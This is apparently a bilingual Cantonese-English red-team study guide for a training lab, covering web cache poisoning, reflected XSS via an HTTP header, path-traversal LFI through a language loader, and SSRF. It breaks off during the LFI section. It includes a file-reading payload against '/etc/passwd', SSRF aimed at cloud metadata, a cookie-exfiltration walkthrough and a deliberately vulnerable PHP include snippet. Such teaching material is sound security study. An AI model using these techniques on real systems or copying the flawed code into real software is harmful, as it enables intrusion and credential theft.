# ART T3 ART_T3_07：攻擊鏈⑤ 橫向檔案存取（Lateral File Access）— 雙語應考學習指南

> **原教材**：Advanced Red Team — Tutorial 3（PDF p.66–73、86–96、112–119、143–154）｜覆蓋 section：§5、§7、§10、§14
> **來源檔**：`_PH5_lateral_file_access_SRC.txt`（由第三方英文教材按攻擊鏈階段重新打包嘅純文字）
> **閱讀方法**：繁中解說理解邏輯 → 英文 Blockquote 直接背誦 → 逐節 Walkthrough 照做 → 最後對照懶人包自測
> **本檔邊界**：只覆蓋 §5 Web Cache Poisoning、§7 Reflected XSS via HTTP Header、§10 LFI via Language Loader、§14 SSRF。
> 　§13 OAuth 唔屬本檔（見 ART_T3_04）；§11 Host Privesc 唔屬本檔（見 ART_T3_08），全檔只作交叉引用。
> **相關筆記**：➜ 憑證蒐集見 `ART_T3_06_CredentialDiscovery_StudyGuide.md`；主機淪陷見 `ART_T3_08_HostCompromise_StudyGuide.md`；速記見 `ART_Final_CheatSheet.md`

---

## 🧭 本檔導讀（How to use this guide）

本檔按原文順序覆蓋四個 section，每節都可獨立溫習：

| 節 | 主題 | 原文頁 | 核心 CWE／OWASP | 對應 Walkthrough |
|---|---|---|---|---|
| §5 | Web Cache Poisoning | p.66–73 | A05:2021 | §5.1 |
| §7 | Reflected XSS via HTTP Header | p.86–96 | CWE-79 / A03:2021 | §5.2 |
| §10 | LFI via Language Loader | p.112–119 | CWE-22 / A01:2021 | §5.3 |
| §14 | Server-Side Request Forgery | p.143–154 | CWE-918 / A10:2021 | §5.4 |

> **圖示規則**：本檔零原圖。凡原文有 `Screenshot NN` 之處，一律以 `> **圖示描述**：…（原教材截圖，本筆記不轉載圖片）` 交代畫面內容。
> **答案規則**：原文 53 題全部冇 render 答案；本檔涵蓋嘅 **15 題**答案一律標 `> ⚠️ 教材外補充（答案）`。
> **Payload 規則**：凡係原文出現過嘅 URL／header／payload／指令，一律逐字保留，唔會改寫。

---

## 📝 1. 橫向檔案存取 概要與實務情境

本階段係攻擊鏈嘅**第⑤階段「橫向檔案存取（Lateral File Access）」**。前四個階段（①公開偵察 → ②初始存取 → ③權限提升 → ④憑證蒐集）係「拿到 foothold（落腳點）」同「搵料」；到咗第⑤階段，攻擊者手上已經有普通帳號、有少少憑證、又大概摸清楚靶場結構，於是開始做三件事：（A）**喺伺服器端讀到唔應該讀到嘅檔案**（LFI、SSRF 讀檔）、（B）**由伺服器代自己去打內部網絡**（SSRF 打 metadata／內部 API）、（C）**污染共享中間層，令自己嘅 payload 送畀其他用戶**（Web Cache Poisoning、Reflected XSS）。一句講：呢一階段係「由單一帳號，橫向摸去其他用戶、其他檔案、其他內部服務」嘅樞紐，所以叫「橫向」。

本檔一次過覆蓋原文四個獨立 section，佢哋表面上係四個唔同漏洞，但骨子裏共用同一條**根本病因線**：**「用戶控制嘅輸入，被程式當成可信嘅路徑／URL／頭部直接使用，冇驗證、冇 allow-list」**。§5 係「header 值被當成 hostname 砌入 HTML，而 cache key 又漏咗佢」；§7 係「header 值被當成用戶名，原封不動 echo 入頁面」；§10 係「`?lang=` 參數被直接拼入檔案路徑」；§14 係「`?url=`／表單 URL 被直接攞去 `file_get_contents()` 發請求」。讀嘅時候請不斷自問：「呢個輸入係邊度嚟？程式有冇當佢係人打嘅嘢去驗證？」——呢條問題答得到，四節就通。

**前置假設**：本檔假設你已經完成 ①公開偵察（識得喺靶場周圍行、睇 page source）、②初始存取（有一個普通帳號同 active session）、③權限提升、④憑證蒐集（至少搵到一條可用憑證或一個 foothold）。§10 嘅第二、三步更加會**直接依賴 §9 備份檔爆破**嘅成果（即係搵到 `/backup/config.php.bak`）；§7 偷到嘅 `PHPSESSID` 亦會**交叉鏈去 §13 OAuth**（嗰部分屬 ART_T3_04 檔）。冇呢啲前置，你照做 Walkthrough 都做得到，但你就睇唔到「鏈式攻擊」嘅威力。

**實務情境一（真實滲透測試）**：你受僱評估一個客戶嘅政府入口網站。做咗 recon 之後，你喺 `/contact.php` 見到「Return to home」連結嘅 hostname 竟然係由 request header 砌出嚟；你用 proxy 改 `X-Forwarded-Host`，發現頁面立即變；再留意到回應有 `X-Cache: HIT` 之類嘅 header，於是你知道前面有個 shared cache。呢個就係 §5 嘅切入點——假如成功污染，之後每個訪問該頁嘅市民都會收到你植入嘅惡意連結。同一時間你發現 `/services.php` 有「Page Preview」功能，一試之下伺服器會代你去 fetch 任何 URL——呢個就係 §14 SSRF 嘅切入點，配合雲環境（`169.254.169.254`）可以一次過拎到雲端憑證。兩個漏洞串埋一齊，就係一隻「唔用戶主機被入侵、但己方已橫向攞到大量內部資料」嘅高嚴重度報告。

**實務情境二（攻防演練／CTF）**：CTF 靶場通常時間有限，橫向階段嘅策略係「**先易後難、先讀後打**」。最易嘅係 §10 LFI——`?lang=` 呢類參數一試 payload 就見真章，讀 `/etc/passwd` 零成本、無副作用，幾乎係熱身題。跟住係 §14 SSRF——`/imgproxy.php?url=file:///etc/passwd` 可以當「任意檔案讀取器」用，係由「外部 URL」跨去「內部服務」嘅橋樑。再上就係 §7 反射 XSS——當靶場冇得直接讀檔，就要靠偷 admin 嘅 session cookie 去接管帳號（屬 ART_T3_04／§13 範疇）。最考功夫嘅係 §5 Cache Poisoning——因為你要先清 cache、再用 canary 確認 unkeyed input，次序做錯就會失敗，但成功嗰一刻一個 request 就影響成千上萬用戶，回報極高。

> **English Standard Definition:** Lateral file access groups together the techniques that let an attacker read files or make requests on the server's behalf — Local File Inclusion, Server-Side Request Forgery, cache poisoning, and reflected header XSS — all rooted in unvalidated client-controlled input.

---

## 🎯 2. 學習目標

1. **定義 unkeyed input 並解釋 cache key 關係** — Define "unkeyed input" and explain its relationship to the cache key.
2. **對一個 shared cache 做 web cache poisoning** — Poison a shared cache so later visitors receive the attacker's content.
3. **識別常見可反射嘅 proxy header** — Identify common proxy-related headers (`X-Forwarded-Host`、`X-Forwarded-For`、`X-Original-URL`、`X-Rewrite-URL`、`X-Host`) that can be unkeyed.
4. **用 canary 值證明 header 屬 unkeyed input** — Use a canary value to prove a header is an unkeyed input reflected into a cached response.
5. **解釋反射 XSS 為何不限於 URL 參數** — Explain why reflected XSS is not limited to URL parameters, but includes HTTP headers.
6. **用三種以上 HTML vector 觸發 JS** — Trigger JavaScript through `script` tags, image error handlers, and element load handlers.
7. **解釋 header 為何唔會經過前端 JS 檢查** — Explain why a browser-injected header bypasses client-side JavaScript validation entirely.
8. **用 XSS 偷 session cookie 並外傳** — Use reflected XSS to read `document.cookie` and exfiltrate it to an attacker-controlled listener.
9. **解釋 i18n language loader 點樣變成 LFI** — Explain how an i18n language loader becomes LFI when the `?lang=` value is concatenated into a file path.
10. **用 path traversal 讀取任意檔案** — Use `../` sequences to escape the intended directory and read arbitrary files such as `/etc/passwd`.
11. **寫出 allow-list + `basename()` + `realpath()` 嘅安全寫法** — Write the correct defensive pattern using an allow-list, `basename()`, and a `realpath()` containment check.
12. **分辨 LFI 與 RFI，並講出 LFI 升級 RCE 嘅方法** — Distinguish LFI from Remote File Inclusion and describe escalation to RCE via log poisoning, session files, and PHP wrappers.
13. **識別 SSRF injection point** — Identify SSRF injection points: Page Preview (`/services.php`)、Report Export (`/pdf.php`)、image proxy (`/imgproxy.php`).
14. **強制伺服器讀取雲端 metadata 同內部 API** — Force the server to fetch cloud metadata (`169.254.169.254`) and internal API secrets.
15. **解釋為何要限制伺服器 outbound request** — Explain why outbound requests from the server must be allow-listed and why network perimeter defence alone cannot stop SSRF.

---

## 🧩 3. 零經驗先修（Prerequisites, in plain words）

以下每一項都係本檔會用到、但原文假設你已經識嘅基礎。每項：一句定義 ＋ 一個生活化比喻 ＋ 一句英文。

- **HTTP request／response（請求／回應）**：瀏覽器發一段文字（request）去伺服器，伺服器回一段文字（response）返嚟。比喻：你寄信去問問題，對方回信答你。／ *An HTTP request is what the browser sends; the response is what the server returns.*
- **HTTP request header（請求頭）**：request 開頭嗰幾行「`名: 值`」，例如 `User-Agent: Firefox`，用嚟附帶 metadata（唔係表單內容）。比喻：信封上嘅寄件人／郵戳，唔係信紙內容，但郵差一樣會睇。／ *Request headers are key-value lines carrying metadata such as `User-Agent` and `Referer`.*
- **`$_GET` 與 `$_POST`（PHP 超全域）**：PHP 用嚟讀 URL 參數（`?lang=en` → `$_GET['lang']`）同表單提交（`$_POST['preview_url']`）嘅陣列。比喻：`$_GET` 係寫喺信封外面嘅字，人人可見；`$_POST` 係信紙裡面嘅字。／ *`$_GET` reads URL query parameters; `$_POST` reads form body fields.*
- **Cache（快取）**：中間層幫你暫存回應，下個人問同一條 URL 就直接派存貨，減低伺服器負擔同延遲。比喻：便利店雪櫃預先擺好飲品，客人唔使等即攞。／ *A cache stores responses so later visitors with the same cache key get the stored copy.*
- **Cache key（快取鍵）**：cache 用嚟判斷「兩條 request 係咪應該收同一份存貨」嘅依據；如果一個輸入唔喺 cache key 入面但會改變 response，佢就係 **unkeyed input**。比喻：雪櫃標籤只寫「可樂」，但實際飲品味道會因某個冇寫落標籤嘅因素而變——標籤漏咗嗰個因素。／ *A cache key is the set of inputs the cache uses to decide whether two requests share one stored response.*
- **Reverse proxy／load balancer（反向代理／負載平衡器）**：企喺應用前面嘅中間伺服器，代應用收 request、加／改 header（例如 `X-Forwarded-Host`）。比喻：公司接待處，代你收信、喺信上蓋章再轉交部門。／ *A reverse proxy forwards requests and often adds headers such as `X-Forwarded-Host`.*
- **`md5()`**：一種 hash 函數，將任意長度字串變成 32 個十六進位字元嘅固定長度指紋。比喻：雜貨店用顏色貼紙代表貨品，肉眼認色快過讀全名。／ *`md5()` produces a fixed-length hash fingerprint of its input.*
- **XSS（Cross-Site Scripting）**：將可執行 JavaScript 注入其他人睇到嘅網頁，令對方瀏覽器以該網站身份執行你嘅程式碼。比喻：喺公告板偷偷貼一段字，其他人一睇就跟住做。／ *XSS injects executable JavaScript into a page viewed by other users.*
- **Reflected／Stored／DOM-based XSS**：反射＝伺服器即刻把輸入回彈；儲存＝payload 存咗喺伺服器，之後訪客都中；DOM-based＝由前端 JavaScript 自己處理 payload。比喻：反射＝即時回聲；儲存＝貼喺牆上留低；DOM＝你自己屋企鏡像。／ *Reflected returns input immediately; stored persists it server-side; DOM-based is processed entirely in client JavaScript.*
- **Output encoding（輸出編碼）**：把 `<`、`>` 等 HTML 有特殊意思嘅字元轉成實體（例如 `&lt;`），令佢只顯示為文字、唔會被當標籤解析。比喻：把炸彈包裹寫明「內有易燃物」，令佢失效。／ *Output encoding neutralises metacharacters so markup is displayed, not executed.*
- **Session cookie／`PHPSESSID`**：伺服器發畀你嘅「身份證明」字串，瀏覽器之後每次 request 都帶住佢，伺服器見cookie 就當你已登入。比喻：酒店房卡，有你房卡就等於你。／ *A session cookie such as `PHPSESSID` identifies an authenticated session to the server.*
- **`HttpOnly`**：一個 cookie 屬性，令 JavaScript 讀唔到 `document.cookie`，專治 XSS 偷 cookie。比喻：房卡鎖入保險箱，唔畀前檯職員睇到號碼。／ *`HttpOnly` prevents JavaScript from reading the cookie via `document.cookie`.*
- **LFI／Path traversal（本地檔案包含／路徑遍歷）**：程式用你嘅輸入拼檔案路徑，你用 `../` 爬出預定目錄，讀到系統檔。比喻：本來只准開抽屜 A，你寫「上一層、再上一層、開 B」就越權。／ *LFI reads arbitrary files because user input is concatenated into a file path.*
- **`include()`／`require()`（PHP 檔案包含）**：把另一個檔案嘅內容「倒」入而家位置；對 PHP 檔嚟講係**執行**佢，唔止讀佢。比喻：唔係影印文件，係直接叫嗰份文件上台演出。／ *In PHP, `include()` inserts and executes the target file's content.*
- **i18n（internationalisation，國際化）**：網站支援多種語言嘅設計，通常每種語言放一個字串檔，用戶揀語言就載入對應檔案。比喻：餐廳餐牌有中英日版，客人指邊版就派邊版。／ *i18n keeps each language's strings in a separate file loaded on demand.*
- **`basename()`／`realpath()`（PHP 檔案路徑函數）**：`basename()` 去掉路徑中所有目錄成份、只留檔名；`realpath()` 把相對路徑解析成絕對真實路徑（順便解開 `../`）。比喻：只認最後一件貨嘅名／把「三樓左轉直行」變成座標。／ *`basename()` strips directory components; `realpath()` resolves the real absolute path.*
- **SSRF（Server-Side Request Forgery）**：應用接受你畀嘅 URL，然後由**伺服器**代你去 fetch 佢。比喻：你唔可以直接入機房，但你可以叫職員幫你行入去攞嘢——職員有通行證。／ *SSRF makes the server fetch a user-supplied URL, inheriting its network position and trust.*
- **`file_get_contents()`（PHP 檔案／URL 讀取）**：讀檔內容入字串；若果傳入 `http://`、`https://`、`file://` URL，佢會開網絡連線（或讀本地檔）並回傳整個 body。比喻：一把萬能鑰匙，開門、開箱、開遠端櫃都得。／ *`file_get_contents()` reads a local path or, given a URL, opens a network connection and returns the body.*
- **Cloud metadata endpoint（雲端 metadata 端點）**：雲 VM 內部一個特殊位址，用嚟攞實例身份、IAM 憑證、user-data 啟動腳本。比喻：酒店後台櫃桶，住客（VM）伸手入去就攞到自己嘅房卡同權限卡。／ *The cloud metadata endpoint exposes instance identity and temporary credentials to the VM.*
- **`169.254.169.254`／link-local**：一個特定位址，喺大部分雲平台都係 metadata 服務；屬 link-local 範圍，通常唔對外開放。比喻：內部電話分機，外面打唔到，內部人一撳就到。／ *`169.254.169.254` is the link-local cloud metadata address on many providers.*
- **`file://` wrapper（PHP URL wrapper）**：一種 URL scheme，令函數由本地檔案系統讀檔，例如 `file:///etc/passwd`。比喻：外賣平台嘅「自取」選項——同一個介面、唔同交付方式。／ *The `file://` wrapper makes a fetch function read local files by path.*
- **Loopback／private IP（回環／私有位址）**：`127.0.0.1`、`10.0.0.0/8`、`192.168.x.x`、`172.16.0.0/12` 係內部位址，外面打唔到但伺服器打到。比喻：屋企內部對講機，外人入唔到屋企但屋企人互通。／ *Loopback and private IP ranges are reachable from the server but not from the internet.*
- **`curl`**：一個 command-line 工具，用嚟直接發 HTTP request、睇 raw response（包括 header 同 binary bytes）。比喻：唔用瀏覽器、直接用手寫信寄出去並收 raw 回覆。／ *`curl` sends HTTP requests from the command line and shows the raw response.*
- **Burp Repeater／Interceptor**：Burp Suite 嘅工具，可以攔截 request、改 header、重複發送。比喻：信件中途被人抽起改內容再寄。／ *Burp Repeater lets you edit and resend a captured request.*
- **`netcat`（`nc`）**：一個可以開監聽 port、接收任何連線嘅工具，常用嚟證明「伺服器真係有連過嚟」。比喻：開一部錄音機，睇吓有冇人打電話入嚟。／ *`netcat` opens a listener so you can observe inbound connections.*
- **Canary value（金絲雀值）**：一個你獨有、隨意嘅字串（例如 `hkiitcanary1234`），用嚟追蹤佢有冇喺 response 出現。比喻：把有記號嘅假鈔放入市面，睇吓幾時再見。／ *A canary is a unique marker used to detect whether your input reaches the response.*
- **Same-Origin Policy（同源政策）**：瀏覽器嘅安全規則，限制一個 origin 嘅頁面唔可以任意讀另一個 origin 嘅資料。比喻：唔同屋苑之間唔可以互開對方信箱。／ *The Same-Origin Policy restricts how one origin's page can access another origin's data.*
- **Content Security Policy（CSP）**：一個由伺服器發嘅 response header，叫瀏覽器「只准執行／載入邊啲來源嘅 script」。比喻：白名單守門員，只放行已批准嘅訪客。／ *CSP tells the browser which script sources it may execute.*
- **HTML entity（HTML 實體）**：用 `&lt;` 代表 `<` 呢類寫法，令字元只當文字顯示。比喻：用密碼代號講出關鍵字，聽者當係普通名詞。／ *An HTML entity represents a character literally, so it is displayed rather than parsed as markup.*
- **Burp Collaborator**：Burp 嘅外站服務，用嚟偵測目標伺服器有冇真係向外發 request。比喻：一個特設嘅郵箱，睇吓有冇人秘密寄信去。／ *Burp Collaborator detects out-of-band interactions such as server-side fetches.*
- **OWASP Top 10**：一份權威嘅「最嚴重 web 漏洞類別」清單，每項有編號（例如 `A03:2021 — Injection`）。比喻：最常考嘅十大通病排行榜。／ *The OWASP Top 10 lists the most critical web application security risks.*
- **CWE**：Common Weakness Enumeration，一個為弱點類型編號嘅公共目錄（例如 `CWE-79` = XSS）。比喻：病症嘅國際編碼，方便全世界溝通。／ *CWE is a catalogue of software weakness types identified by number.*

---

## 📖 4. 逐節深度知識點重寫

### 4.1 §5 Web Cache Poisoning（原文 p.66–73）

**本節學習目標（原文）**：解釋 unkeyed input 係乜、污染一個 shared cache、理解為何 cache key 必須包含所有會影響 response 嘅輸入。

#### 4.1.1 係乜、為何有效（What is it and why does it work?）

Web cache 會儲起 response 嘅副本，減低伺服器負載同延遲，之後會派畀「cache key 相同」嘅訪客。**Cache key** 就係 cache 用嚟判斷兩條 request 應否收同一份存貨嘅一組值。**Web cache poisoning（快取污染）** 就係呃個 cache 儲起一份有害 response，然後派畀其他請求同一條 URL 嘅用戶。攻擊利用一個**錯配（mismatch）**：如果 response 內容取決於一個**唔屬於 cache key** 嘅輸入，嗰個輸入就叫 **unkeyed input**。

在本 lab 入面，應用程式用 `X-Forwarded-Host` header 嚟砌內部連結，但 cache key 淨係 `` `md5($_SERVER['REQUEST_URI'])` ``。header 會改變頁面，但 cache key 完全忽略佢——呢個就係漏洞核心。

> **English Standard Definition:** Web cache poisoning tricks the cache into storing a harmful response and serving it to other users who request the same URL; the attack exploits a mismatch where the response depends on an input that is not part of the cache key, called an unkeyed input.

一句原文值得背（原文如此）：「the cache key is only `md5($_SERVER['REQUEST_URI'])`」——cache key 淨係計 URL，唔計 header，所以 header 一改，存貨就毒。

- **OWASP 對應**：A05:2021 — Security Misconfiguration。
- **In the wild**：PortSwigger 嘅 James Kettle 透過搵到「會改變 response 嘅 unkeyed input」，成功對大量熱門網站示範 cache poisoning。
- **結論（原文結論）**：Kettle 2018 年嘅研究「Practical Web Cache Poisoning」顯示 `X-Forwarded-Host` 呢類冷門 HTTP header 可以把 shared cache 變成「攻擊派送系統」；佢 2020 年嘅後續研究「Web Cache Entanglement」就探討咗 cache-key normalization 嘅缺陷。**影響係乘數級（multiplicative）**：一條惡意 request 可以污染一份 cache entry，再派畀之後成千上萬嘅訪客。後果包括 reflected／stored XSS、open redirect、惡意 JavaScript 引入、釣魚。防禦包括：只 cache 真正靜態嘅內容、把 unkeyed input 剝走或加埋入 cache key、避免用客戶端可控 header 嚟砌 response。

#### 4.1.1b 本節關鍵值速覽

| 項目 | 本 lab 值 | 意義 |
|---|---|---|
| Cache key | `md5($_SERVER['REQUEST_URI'])` | 只計 URL，忽略 header |
| Unkeyed input | `X-Forwarded-Host` | 改 header 就改到 response |
| 砌連結嘅 helper | `get_base_url()`（住 `functions.php`） | 由 request header 砌絕對 URL |
| Canary | `hkiitcanary1234` | 確認反射 |
| 毒 host | `evil.example.com` | 污染 cache 用 |
| 清 cache 端點 | `/clear_cache.php` | 保證有全新 entry |
| OWASP | A05:2021 | Security Misconfiguration |

#### 4.1.2 如何發現（How to find it）

- **Map 會影響 response 嘅輸入**：打開 `/contact.php`、右鍵選 View page source，或者用 DevTools 嘅 Elements tab。搵內部連結（例如「Return to home」），自問：「呢條連結 hostname 係由咩決定？」
- **測客戶端可控 header**：如果應用信任 `X-Forwarded-Host` 或 `X-Forwarded-Proto` 呢類 header，你送嘅值就可以改動 HTML。
- **偵測 unkeyed input**：用一個 canary 值（例如 `hkiitcanary1234`）喺可疑 header（`X-Forwarded-Host`、`X-Forwarded-For`、`X-Original-URL`、`X-Rewrite-URL`、`X-Host`）重發 request。若果 URL 不變、header 一改 response body 就變，嗰個 header 就係 unkeyed input。在本 lab，「Return to home」anchor 嘅 `href` 會直接反射 header 值。
- **確認 cache 已被污染**：用一個**全新、冇帶該 header** 嘅瀏覽器 session 載入同一條 URL。若果有毒連結仍然被派返，證明 cache 真係存咗攻擊者控制嘅 response。
- **留意破綻（tell-tale differences）**：測試期間留意 response body 長度、連結入面出現新 hostname、被改過嘅 JavaScript URL——呢啲都係 unkeyed input 改緊頁面嘅指紋。

> **English Standard Definition:** An unkeyed input is a request input that changes the response but is not included in the cache key, so a cache may store a poisoned response under a URL that later visitors will request.

#### 4.1.3 為何會存在：`get_base_url()` 嘅真實用途

原文指出一個關鍵背景，亦係「新手最易誤解」嘅位：開發者咁做**唔係**為咗整漏洞，而係因為合法需求。一個企喺 reverse proxy 或 load balancer 後面嘅應用，**睇唔到訪客實際用嘅 hostname**；所以 proxy 會透過 `X-Forwarded-Host` 把真實 hostname 轉發入嚟，應用就用佢嚟產生**絕對 URL**（absolute URL），畀連結、redirect、重設密碼電郵用。呢個做法本身係合法嘅——但問題係**呢個值係客戶端可控（client-controllable）**，而 cache key `` `md5($_SERVER['REQUEST_URI'])` `` 又忽略咗佢，令佢變成 unkeyed input。在本 lab，`functions.php` 入面嘅 `get_base_url()` helper 就係由 `X-Forwarded-Host` request header 砌出「Return to home」嘅 `href`，唔係由任何表單欄位。

> **English Standard Definition:** Applications behind a reverse proxy read `X-Forwarded-Host` to generate absolute URLs because they cannot see the visitor's hostname directly — but the value is client-controllable, and a cache key that ignores it makes it an unkeyed input.

---

### 4.2 §7 Reflected XSS via HTTP Header（原文 p.86–96）

**本節學習目標（原文）**：辨識「HTTP header 輸入被無編碼地印入頁面」嘅反射 XSS，並透過 `script` 標籤、圖片 error handler、元素 load handler 等多種 HTML vector 觸發 JavaScript。

> **English Standard Definition:** Reflected header XSS occurs when markup smuggled in an HTTP header is echoed into the page without encoding, so the victim's browser executes it with the site's privileges.

#### 4.2.1 係乜、為何有效（What is it and why does it work?）

**Cross-Site Scripting (XSS)** 令攻擊者把可執行 JavaScript 注入其他人睇到嘅網頁。對應 **CWE-79: Improper Neutralization of Input During Web Page Generation**。自微軟工程師喺 2000 年首次記錄以嚟，只要應用把未信任嘅資料放入網頁而冇正確編碼或驗證，XSS 就會出現——瀏覽器會以受影響網站嘅**安全上下文（security context）**去執行攻擊者提供嘅 script。**Reflected XSS**（本 lab 嘅變種）係伺服器即刻把惡意輸入喺 response 回彈，冇編碼、冇 sanitization。另外兩種變種係 **stored**（payload 存喺伺服器，之後訪客都見到）同 **DOM-based**（payload 完全由客戶端 JavaScript 處理）。

本 lab 把 `X-Username` header 嘅值直接反射入 `/index.php` 嘅 HTML。**`X-Username` 唔係標準 HTTP header**——佢係**應用自訂 header**，用嚟攜帶未登入訪客嘅顯示名。PHP 會把每個入站 request header 映射去 `` `$_SERVER['HTTP_*']` `` 伺服器變數，所以 `X-Username` header 入到程式碼就變成 `` `$_SERVER['HTTP_X_USERNAME']` ``，而 `index.php` 把佢直接 echo 入問候語嘅 `span` 入面，**完全冇編碼**——lab 程式碼嘅註釋甚至講明：「// Intentionally not escaped for the header-XSS demonstration」。

**真實應用點解會有呢種 header？** 原文列咗幾個原因：呢類 header 可能由上游 reverse proxy 或 SSO gateway 蓋章加入（把用戶名印上每個 request）、由舊式 mobile app 或 API client 發送、或者係開發者唔記得剷走嘅 debug instrumentation。所以即使冇任何瀏覽器表單會設定佢，佢都可以存在於 request path 之中。雖然瀏覽器通常阻止網頁設定任意 header，但 header 仍然可以由 proxy、瀏覽器 extension、developer tools、或者 Burp Suite／OWASP ZAP 呢類工具控制。**任何喺 header 入面嘅 HTML 或 script，都會被受害者瀏覽器渲染。**

> **English Standard Definition:** XSS is CWE-79: Improper Neutralization of Input During Web Page Generation — an application includes untrusted data in a web page without proper encoding or validation, so the browser executes attacker-supplied script in the site's security context.

#### 4.2.1b 三種 XSS 變種對照

| 變種 | 觸發位置 | PoC 特徵 | 本 lab 是否用 |
|---|---|---|---|
| Reflected | 伺服器即刻回彈輸入 | 一次性，喺 response 即時見到 | ✅ 本節主題 |
| Stored | payload 存喺伺服器 | 之後任何訪客都會中 | ✗（交叉參考） |
| DOM-based | 由客戶端 JavaScript 處理 | 伺服器 response 未必見到 payload | ✗（交叉參考） |

**黑盒測試時嘅 header 候選清單（原文）**：熱門 → `User-Agent`、`Referer`、`X-Forwarded-For`、`Cookie`；自訂 → `X-Username`、`X-User`、`X-User-ID`、`X-Forwarded-User`。

#### 4.2.2 黑盒點搵（How would you find this in a black-box pentest?）

原文問：冇 source code 讀嘅情況下點搵？答：**把 request header 當成未測試嘅輸入面，去搵反射（reflection）**。

- 首先，喺每個你能影響嘅輸入（URL 參數、表單欄位、cookie、request header）送一個獨特 canary 字串（例如 `CANARY_TEST_123`），再喺 response body 搜尋嗰個 canary。
- 然後**對 header 名本身做 fuzz**：先試熱門候選（`User-Agent`、`Referer`、`X-Forwarded-For`、`Cookie`），再用自訂 header 字表（`X-Username`、`X-User`、`X-User-ID`、`X-Forwarded-User`）揼入 Burp Intruder 或 Burp extension **Param Miner**，標記任何 response body 有變嘅。
- 在本 lab 破綻即刻可見：送 `X-Username: test`，平時讀「visitor」嘅問候語就變返 `test`——證明 header 未經轉義就到達頁面。呢個發現就係你之後用本節 payload 去確認同武器化嘅起點。

- **OWASP 對應**：A03:2021 — Injection (Cross-Site Scripting)。
- **為何高危**：XSS 一直係最常被報告嘅 bug class 之一，因為單一個無編碼反射就可以導致 session hijacking 同帳號接管。
- **真實影響**：session hijacking、透過假登入覆蓋層偷憑證、keylogging、派發惡意軟件、以受害者身份做未授權操作。XSS 經常出現喺 HackerOne 最高報告弱點類別同 CISA KEV catalog。標準緩解係 context-aware output encoding、Content Security Policy (CSP)、同現代框架自動轉義。

#### 4.2.3 如何發現（How to find it）逐點

- **Map 每個到達 response body 嘅輸入**：URL 參數、表單欄位、cookie，同 `User-Agent`、`Referer`、或 `X-Username` 呢類自訂 header。
- **打開首頁、開 DevTools，檢查 Network 同 Elements tab**：睇吓送咗咩、落咗喺邊。
- **喺每個輸入送獨特 canary，再喺 response source 搜尋**：逐個輸入用唔同 canary，先定位反射點。
- **若 canary 原封不動出現，就測 HTML metacharacters**：例如 `<` 同 `>` 有冇被無編碼反射。有 raw angle-bracket 就即係可執行輸出。
- **用 browser console 或 intercepting proxy 重播改過 header 嘅 request**：`fetch` 或 proxy replay 去測 header 反射。
- **把每個到達頁面嘅 byte 都當成潛在注入點**——唔理佢來自表單欄位定 header。

#### 4.2.4 個反射點可以點武器化（多 HTML vector）

原文強調：**同一個反射點可以透過幾種唔同 HTML vector 執行 JavaScript**。所有 payload 都係以 `X-Username` header（一個普通 `GET /index.php` request）送出——喺 Burp Repeater 把 payload 貼成 header 值；lab 工具 `tools/xss_header.py` 亦可以幫你送測試 payload。**注意反射只會喺你未登入時出現**：已登入訪客嘅問候語會顯示佢自己（正確轉義）嘅用戶名。

- **證明反射**：canary 係一個你控制嘅獨特值，原封不動出現就係反射點。送 `X-Username: CANARY_TEST_123`，page source 見到問候語讀「visitor, CANARY_TEST_123」，canary 未變咁渲染喺 `span id="user-greeting"` 元素入面。
- **`script` tag**：header 值冇編碼插入，瀏覽器就會執行任何標記。證明：頁面四周出現粗紅邊框（無害但鐵證）。
- **`img` + error handler**：唔係每個反射點都容許 `script` tag，攻擊者就退而用其他 tag 嘅 event handler。`src=x` 載入失敗觸發 `onerror`，把問候語換成 highlight 標記。
- **SVG load handler**：`onload` 喺元素載入完成時觸發。`body onload=...` 喺現存 `span` 入面唔 work，但 **SVG 元素會**，因為佢喺嗰度被 parse 同載入。
- **偷 session cookie 並顯示**：同一個 `onerror` handler 可以讀 `document.cookie`（受害者嘅 session token）再寫入頁面。
- **外傳 cookie 去攻擊者伺服器**：顯示 cookie 只證明有 access；真實攻擊會送佢去攻擊者控制嘅伺服器（用 `netcat` 監聽）。本 lab 因為冇外部攻擊主機，亦會對 lab 自己嘅 leak endpoint 做示範。

**原文結論**：應用把 header 值 echo 入問候語 `span` 而毫無編碼（見 `index.php` 嘅 `echo $_SERVER['HTTP_X_USERNAME']` 一行）。因為反射係喺**元素內容（element content）**而唔係屬性或者 JavaScript 字串入面，攻擊者可以引入全新 tag 同 event handler，瀏覽器就以網站完整權限執行佢哋。

> **English Standard Definition:** Because the reflection sits in element content rather than inside an attribute or JavaScript string, the attacker can introduce entirely new tags and event handlers, and the browser executes them with the site's full privileges.

**原文提醒（重要的新手盲點）**：翻返理論段落，理解**為何瀏覽器阻止網頁設定任意 header**——以及真實攻擊點樣照樣送達惡意 header（intercepting proxy、reflectable reverse proxy、browser extension、或者可反射嘅 URL 參數）。

---

### 4.3 §10 Local File Inclusion via Language Loader（原文 p.112–119）

**本節學習目標（原文）**：用 path traversal 透過一個有漏洞嘅檔案包含功能讀取任意檔案。

> **English Standard Definition:** Local File Inclusion (LFI) occurs when an application loads a file based on user-supplied input without proper validation, allowing directory traversal sequences such as `../` to escape the intended directory.

#### 4.3.1 係乜、為何有效（What is it and why does it work?）

**Local File Inclusion (LFI)** 出現喺應用**基於用戶提供嘅輸入載入檔案而冇適當驗證**嘅時候。對應 **CWE-22: Improper Limitation of a Pathname to a Restricted Directory**——如果輸入被直接拼入檔案路徑，攻擊者就可以用 `../` 呢類目錄遍歷序列爬出預定目錄，讀取伺服器上任意檔案。喺 PHP，`include()`、`require()`、`file_get_contents()` 都係常見嘅 sink（危險落點）。

**為何網站要用 language loader（i18n），以及佢點樣變成漏洞。** 網站要以多種語言提供同一內容——英文、簡體中文（zh）、繁體中文（zht）。應用唔會把每頁 hard-code 三次，而係把每種語言嘅字串放喺獨立檔案，載入用戶揀嘅嗰個：網站顯示一個語言切換器，設定一個例如 `http://localhost:8080/index.php?lang=en` 嘅參數，而伺服器上嘅 loader 就由嗰個參數砌出檔案路徑並 include 佢。本 lab 每種語言都儲成**無副檔名嘅 PHP 檔**（`lang/en`、`lang/zh`、`lang/zht`）——loader 住喺 `includes/language.php`，你可以喺瀏覽器直接讀 `http://localhost:8080/includes/language.php`（或 `view-source:http://localhost:8080/includes/language.php` 睇未渲染版本）。

```php
// Each language file is a PHP file that returns an array of strings:
// lang/en  ->  return ['welcome' => 'Welcome', 'search' => 'Search', ...];

$lang = $_GET['lang'];
$strings = include("lang/" . $lang);   // load the chosen language
```

